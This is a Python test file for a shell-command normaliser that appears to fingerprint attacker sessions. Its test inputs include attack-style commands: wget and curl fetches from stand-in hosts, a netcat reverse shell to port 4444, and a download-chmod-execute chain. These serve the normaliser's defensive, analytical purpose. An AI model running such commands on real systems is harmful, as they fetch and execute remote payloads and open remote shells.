"""The command normaliser: placeholders, no-ops, bounds and a stable fingerprint."""

from __future__ import annotations

import time

from ingest.normalize import (
    MAX_COMMANDS,
    fingerprint,
    meaningful_count,
    normalize_command,
    normalize_commands,
    normalize_text,
)


def test_urls_ips_hosts_and_numbers_become_placeholders() -> None:
    assert normalize_command("WGET http://203.0.113.9:8080/x.sh") == "wget <url>"
    assert normalize_command("ping -c 4 198.51.100.7") == "ping -c <n> <ip>"
    assert normalize_command("curl -o /tmp/a evil.example.com") == "curl -o /tmp/a <host>"
    assert normalize_command("chmod 777 /tmp/payload.sh") == "chmod <n> /tmp/payload.sh"
    assert normalize_command("nc 192.0.2.5:4444 -e sh") == "nc <ip> -e sh"


def test_blobs_are_collapsed_but_plain_paths_are_kept() -> None:
    assert normalize_command("echo " + "a1" * 20) == "echo <blob>"
    assert normalize_command("echo " + "aGVsbG8gd29ybGQh" * 2 + "==") == "echo <blob>"
    assert normalize_command("ls /usr/local/share/applications") == (
        "ls /usr/local/share/applications"
    )
    assert normalize_command("echo " + "x" * 300) == "echo <blob>"


def test_noops_and_empty_commands_are_dropped() -> None:
    assert normalize_commands(["cd /tmp", "pwd", "", "   ", "true", "uname -a"]) == ["uname -a"]


def test_separators_split_one_line_and_whitespace_collapses() -> None:
    line = "cd /tmp;  wget   http://192.0.2.1/a && chmod +x a || sh a | cat"
    assert normalize_commands([line]) == ["wget <url>", "chmod +x a", "sh a", "cat"]


def test_same_script_with_other_addresses_has_one_fingerprint() -> None:
    a = normalize_text("cd /tmp\nwget http://192.0.2.1/x86\nchmod 777 x86\n./x86 198.51.100.1")
    b = normalize_text("cd /var\nwget http://203.0.113.5:81/x86\nchmod 755 x86\n./x86 192.0.2.77")
    assert a == b
    assert fingerprint(a) == fingerprint(b)
    assert meaningful_count(a) == 3
    assert fingerprint(a) != fingerprint(a[:-1])


def test_input_is_bounded() -> None:
    many = [f"echo {i}" for i in range(500)]
    assert len(normalize_commands(many)) == MAX_COMMANDS
    huge = "uname -a;" * 5000
    assert len(normalize_text(huge)) <= MAX_COMMANDS


def test_hostile_input_is_linear() -> None:
    start = time.monotonic()
    normalize_text("a" * 8000 + "." * 8000 + ("1." * 4000))
    normalize_commands([";" * 9000, "|" * 9000, "'" * 9000])
    assert time.monotonic() - start < 1.0


def test_file_names_are_not_hosts() -> None:
    assert normalize_command("rm payload.sh config.json") == "rm payload.sh config.json"
